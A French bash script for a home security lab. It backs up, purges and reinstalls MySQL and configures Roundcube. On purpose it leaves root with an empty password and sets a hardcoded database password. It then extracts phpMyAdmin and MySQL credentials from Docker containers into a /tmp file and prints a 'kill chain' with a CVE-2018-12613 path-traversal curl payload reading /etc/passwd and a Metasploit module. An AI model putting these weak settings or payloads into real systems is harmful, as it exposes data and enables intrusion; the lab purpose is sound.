#!/bin/bash

# Script de diagnostic, sauvegarde et réinstallation MySQL - Iron4Software Lab
# Auteur: Philippe - Projet Iron4Software
# Date: 2026-01-21

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

BACKUP_DIR="/tmp/mysql_backup_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="/tmp/mysql_fix.log"

echo -e "${BLUE}"
echo "=========================================================="
echo "   MySQL Backup & Reinstall - Iron4Software Lab"
echo "=========================================================="
echo -e "${NC}"

# Fonction de logging
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1" | tee -a "$LOG_FILE"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1" | tee -a "$LOG_FILE"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_FILE"
}

# Créer le répertoire de sauvegarde
mkdir -p "$BACKUP_DIR"
log_info "Répertoire de sauvegarde: $BACKUP_DIR"

# 1. DIAGNOSTIC INITIAL
echo -e "\n${BLUE}=== PHASE 1: DIAGNOSTIC INITIAL ===${NC}"

log_info "Vérification de l'installation MySQL..."
if dpkg -l | grep -qE "mysql-server|mariadb-server"; then
    log_info "MySQL/MariaDB est installé"
else
    log_warn "MySQL n'est pas installé - Installation directe"
    SKIP_BACKUP=true
fi

# 2. TENTATIVE DE SAUVEGARDE
echo -e "\n${BLUE}=== PHASE 2: SAUVEGARDE DES DONNÉES ===${NC}"

if [ "$SKIP_BACKUP" != "true" ]; then
    log_info "Tentative de démarrage temporaire de MySQL..."
    
    # Arrêter MySQL si en cours
    systemctl stop mysql 2>/dev/null || true
    sleep 2
    
    # Essayer de démarrer en mode safe
    log_info "Démarrage en mode safe..."
    mysqld_safe --skip-grant-tables --skip-networking &
    MYSQL_SAFE_PID=$!
    sleep 5
    
    # Vérifier si MySQL répond
    if mysqladmin ping -h localhost 2>/dev/null; then
        log_info "✓ MySQL en mode safe - Sauvegarde en cours..."
        
        # Sauvegarder toutes les bases
        DATABASES=$(mysql -h localhost --skip-column-names -e "SHOW DATABASES;" 2>/dev/null | grep -vE "^(information_schema|performance_schema|mysql|sys)$")
        
        if [ -n "$DATABASES" ]; then
            for DB in $DATABASES; do
                log_info "Sauvegarde de la base: $DB"
                mysqldump -h localhost --single-transaction --quick --lock-tables=false "$DB" > "$BACKUP_DIR/${DB}.sql" 2>/dev/null || log_warn "Échec sauvegarde $DB"
            done
            
            # Sauvegarder les utilisateurs
            log_info "Sauvegarde des utilisateurs..."
            mysql -h localhost --skip-column-names -e "SELECT CONCAT('CREATE USER ''', user, '''@''', host, ''' IDENTIFIED BY PASSWORD ''', authentication_string, ''';') FROM mysql.user WHERE user NOT IN ('root', 'mysql.sys', 'mysql.session', 'debian-sys-maint');" > "$BACKUP_DIR/users.sql" 2>/dev/null || true
            
            log_info "✓ Sauvegarde terminée dans: $BACKUP_DIR"
            ls -lh "$BACKUP_DIR/"
        else
            log_warn "Aucune base utilisateur à sauvegarder"
        fi
        
        # Arrêter MySQL safe
        kill $MYSQL_SAFE_PID 2>/dev/null || true
        sleep 2
    else
        log_warn "MySQL ne répond pas - Sauvegarde impossible"
        log_info "Copie des fichiers MySQL bruts..."
        
        if [ -d /var/lib/mysql ]; then
            cp -a /var/lib/mysql "$BACKUP_DIR/mysql_datadir_backup" 2>/dev/null || log_warn "Échec copie datadir"
        fi
    fi
    
    # Sauvegarder la configuration
    log_info "Sauvegarde de la configuration..."
    cp /etc/mysql/my.cnf "$BACKUP_DIR/my.cnf.backup" 2>/dev/null || true
    cp -r /etc/mysql/mysql.conf.d "$BACKUP_DIR/" 2>/dev/null || true
else
    log_info "Sauvegarde ignorée - MySQL non installé"
fi

# 3. DÉSINSTALLATION COMPLÈTE
echo -e "\n${BLUE}=== PHASE 3: DÉSINSTALLATION MYSQL ===${NC}"

log_info "Arrêt de tous les processus MySQL..."
systemctl stop mysql 2>/dev/null || true
killall mysqld 2>/dev/null || true
killall mysqld_safe 2>/dev/null || true
sleep 2

log_info "Désinstallation des paquets MySQL/MariaDB..."
apt remove --purge -y mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-* mariadb-server mariadb-client 2>/dev/null || true

log_info "Nettoyage des fichiers de configuration..."
rm -rf /etc/mysql /var/lib/mysql /var/log/mysql
rm -rf /var/run/mysqld

log_info "Nettoyage des paquets orphelins..."
apt autoremove -y
apt autoclean

log_info "✓ Désinstallation terminée"

# 4. RÉINSTALLATION MYSQL
echo -e "\n${BLUE}=== PHASE 4: RÉINSTALLATION MYSQL ===${NC}"

log_info "Mise à jour de la liste des paquets..."
apt update

log_info "Installation de MySQL Server..."
DEBIAN_FRONTEND=noninteractive apt install -y mysql-server

log_info "✓ MySQL installé"

# 5. CONFIGURATION INITIALE
echo -e "\n${BLUE}=== PHASE 5: CONFIGURATION MYSQL ===${NC}"

log_info "Démarrage de MySQL..."
systemctl start mysql
sleep 3

if systemctl is-active --quiet mysql; then
    log_info "✓ MySQL démarré avec succès"
    
    # Configuration de sécurité de base
    log_info "Configuration de sécurité..."
    
    # Permettre la connexion root sans mot de passe depuis localhost (pour faciliter le lab)
    mysql <<EOF
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '';
DELETE FROM mysql.user WHERE User='';
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';
FLUSH PRIVILEGES;
EOF
    
    log_info "✓ Configuration terminée"
    
    # Activer au démarrage
    systemctl enable mysql
    
else
    log_error "✗ Échec du démarrage MySQL"
    journalctl -u mysql -n 50 --no-pager
    exit 1
fi

# 6. RESTAURATION DES DONNÉES
echo -e "\n${BLUE}=== PHASE 6: RESTAURATION DES DONNÉES ===${NC}"

if [ -d "$BACKUP_DIR" ] && [ "$(ls -A $BACKUP_DIR/*.sql 2>/dev/null)" ]; then
    log_info "Restauration des bases de données..."
    
    for SQL_FILE in "$BACKUP_DIR"/*.sql; do
        if [ -f "$SQL_FILE" ]; then
            DB_NAME=$(basename "$SQL_FILE" .sql)
            if [ "$DB_NAME" != "users" ]; then
                log_info "Restauration de: $DB_NAME"
                mysql -e "CREATE DATABASE IF NOT EXISTS \`$DB_NAME\`;"
                mysql "$DB_NAME" < "$SQL_FILE" 2>/dev/null || log_warn "Échec restauration $DB_NAME"
            fi
        fi
    done
    
    log_info "✓ Restauration terminée"
else
    log_info "Aucune donnée à restaurer"
fi

# 7. CONFIGURATION ROUNDCUBE
echo -e "\n${BLUE}=== PHASE 7: CONFIGURATION ROUNDCUBE ===${NC}"

log_info "Création de la base Roundcube..."
mysql <<EOF
CREATE DATABASE IF NOT EXISTS roundcubemail CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
GRANT ALL PRIVILEGES ON roundcubemail.* TO 'roundcube'@'localhost' IDENTIFIED BY 'roundcube_pass';
FLUSH PRIVILEGES;
EOF

log_info "Import du schéma Roundcube..."
if [ -f /var/www/html/webmail/SQL/mysql.initial.sql ]; then
    mysql roundcubemail < /var/www/html/webmail/SQL/mysql.initial.sql
    log_info "✓ Schéma Roundcube importé"
else
    log_warn "Schéma Roundcube non trouvé"
fi

log_info "Vérification de la configuration Roundcube..."
if [ -f /var/www/html/webmail/config/config.inc.php ]; then
    if ! grep -q "mysql://roundcube:roundcube_pass@localhost/roundcubemail" /var/www/html/webmail/config/config.inc.php; then
        log_info "Mise à jour de la configuration Roundcube..."
        cp /var/www/html/webmail/config/config.inc.php /var/www/html/webmail/config/config.inc.php.bak
        sed -i "s|\$config\['db_dsnw'\].*|\$config['db_dsnw'] = 'mysql://roundcube:roundcube_pass@localhost/roundcubemail';|" /var/www/html/webmail/config/config.inc.php
    fi
    log_info "✓ Configuration Roundcube OK"
fi

# 8. EXTRACTION CREDENTIALS DOCKER
echo -e "\n${BLUE}=== PHASE 8: EXTRACTION CREDENTIALS DOCKER ===${NC}"

if command -v docker &> /dev/null; then
    
    # phpMyAdmin
    if docker ps | grep -q "phpmyadmin"; then
        PHPMYADMIN_CONTAINER=$(docker ps --format "{{.Names}}" | grep phpmyadmin | head -1)
        log_info "Conteneur phpMyAdmin trouvé: $PHPMYADMIN_CONTAINER"
        
        PMA_USER=$(docker inspect $PHPMYADMIN_CONTAINER | grep -oP 'PMA_USER=\K[^"]+' || echo "root")
        PMA_PASSWORD=$(docker inspect $PHPMYADMIN_CONTAINER | grep -oP 'PMA_PASSWORD=\K[^"]+' || echo "root")
        PMA_HOST=$(docker inspect $PHPMYADMIN_CONTAINER | grep -oP 'PMA_HOST=\K[^"]+' || echo "localhost")
        PMA_PORT=$(docker inspect $PHPMYADMIN_CONTAINER | grep -oP 'PMA_PORT=\K[^"]+' || echo "3306")
        PHPMYADMIN_HOST_PORT=$(docker port $PHPMYADMIN_CONTAINER | grep -oP '0.0.0.0:\K[0-9]+' | head -1)
        
        echo -e "${GREEN}Credentials phpMyAdmin:${NC}"
        echo "  Container: $PHPMYADMIN_CONTAINER"
        echo "  URL: http://192.168.1.250:${PHPMYADMIN_HOST_PORT}"
        echo "  User: $PMA_USER"
        echo "  Password: $PMA_PASSWORD"
        
        cat > /tmp/phpmyadmin_creds.txt <<EOF
# Credentials phpMyAdmin - Iron4Software Lab
URL=http://192.168.1.250:${PHPMYADMIN_HOST_PORT}
USER=$PMA_USER
PASSWORD=$PMA_PASSWORD
MYSQL_HOST=$PMA_HOST
MYSQL_PORT=$PMA_PORT

# Exploitation LFI (CVE-2018-12613):
curl "http://192.168.1.250:${PHPMYADMIN_HOST_PORT}/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
EOF
        log_info "Credentials sauvegardés: /tmp/phpmyadmin_creds.txt"
    fi
    
    # MySQL Docker
    if docker ps | grep -q "mysql"; then
        MYSQL_CONTAINER=$(docker ps --format "{{.Names}}" | grep mysql | head -1)
        MYSQL_ROOT_PASSWORD=$(docker inspect $MYSQL_CONTAINER | grep -oP 'MYSQL_ROOT_PASSWORD=\K[^"]+' || echo "root")
        MYSQL_HOST_PORT=$(docker port $MYSQL_CONTAINER | grep -oP '0.0.0.0:\K[0-9]+' | head -1 || echo "3306")
        
        echo -e "${GREEN}MySQL Docker:${NC} Port: $MYSQL_HOST_PORT, Password: $MYSQL_ROOT_PASSWORD"
    fi
fi

# 9. VÉRIFICATION FINALE
echo -e "\n${BLUE}=== PHASE 9: TESTS FINAUX ===${NC}"

log_info "Test connexion MySQL locale..."
if mysql -e "SELECT VERSION();" 2>/dev/null; then
    log_info "✓ Connexion MySQL OK"
    mysql -e "SHOW DATABASES;"
else
    log_warn "Connexion nécessite un mot de passe"
fi

log_info "Test du webmail..."
curl -I http://localhost/webmail/ 2>/dev/null | head -3

log_info "Redémarrage d'Apache..."
systemctl restart apache2

# 10. RAPPORT FINAL
echo -e "\n${BLUE}=========================================================="
echo "                  RAPPORT FINAL"
echo "==========================================================${NC}"

echo -e "\n${BLUE}Status des services:${NC}"
systemctl is-active mysql && echo -e "  ${GREEN}✓ MySQL Local: ACTIF${NC}" || echo -e "  ${RED}✗ MySQL Local: INACTIF${NC}"
systemctl is-active apache2 && echo -e "  ${GREEN}✓ Apache2: ACTIF${NC}" || echo -e "  ${RED}✗ Apache2: INACTIF${NC}"
docker ps | grep -q phpmyadmin && echo -e "  ${GREEN}✓ phpMyAdmin Docker: ACTIF${NC}" || echo -e "  ${RED}✗ phpMyAdmin Docker: INACTIF${NC}"

echo -e "\n${GREEN}✓ INFRASTRUCTURE OPÉRATIONNELLE${NC}"

echo -e "\n${BLUE}Accès aux services:${NC}"
echo "  • Webmail Roundcube: http://192.168.1.250/webmail/"
if [ -n "$PHPMYADMIN_HOST_PORT" ]; then
    echo "  • phpMyAdmin: http://192.168.1.250:${PHPMYADMIN_HOST_PORT}"
    echo "    Login: $PMA_USER / Password: $PMA_PASSWORD"
fi

echo -e "\n${YELLOW}Kill Chain - Prochaines étapes:${NC}"
echo "  1. Tester webmail: firefox http://192.168.1.250/webmail/"
echo "  2. Accéder phpMyAdmin: firefox http://192.168.1.250:${PHPMYADMIN_HOST_PORT}"
echo "  3. Exploitation LFI (CVE-2018-12613):"
echo "     curl 'http://192.168.1.250:${PHPMYADMIN_HOST_PORT}/index.php?target=db_sql.php%253f/../../../etc/passwd'"
echo "  4. Metasploit: use exploit/multi/http/phpmyadmin_lfi_rce"
echo "  5. Monitoring Splunk: index=linux host=mail*"

echo -e "\n${GREEN}Fichiers générés:${NC}"
echo "  • $BACKUP_DIR/ - Sauvegarde MySQL"
echo "  • /tmp/phpmyadmin_creds.txt - Credentials exploitation"
echo "  • $LOG_FILE - Logs du script"

echo -e "\n${BLUE}==========================================================${NC}"
echo -e "${GREEN}  MySQL réinstallé avec succès - Lab prêt pour l'attaque !${NC}"
echo -e "${BLUE}  MITRE ATT&CK: T1190 - Exploit Public-Facing Application${NC}"
echo -e "${BLUE}==========================================================${NC}"
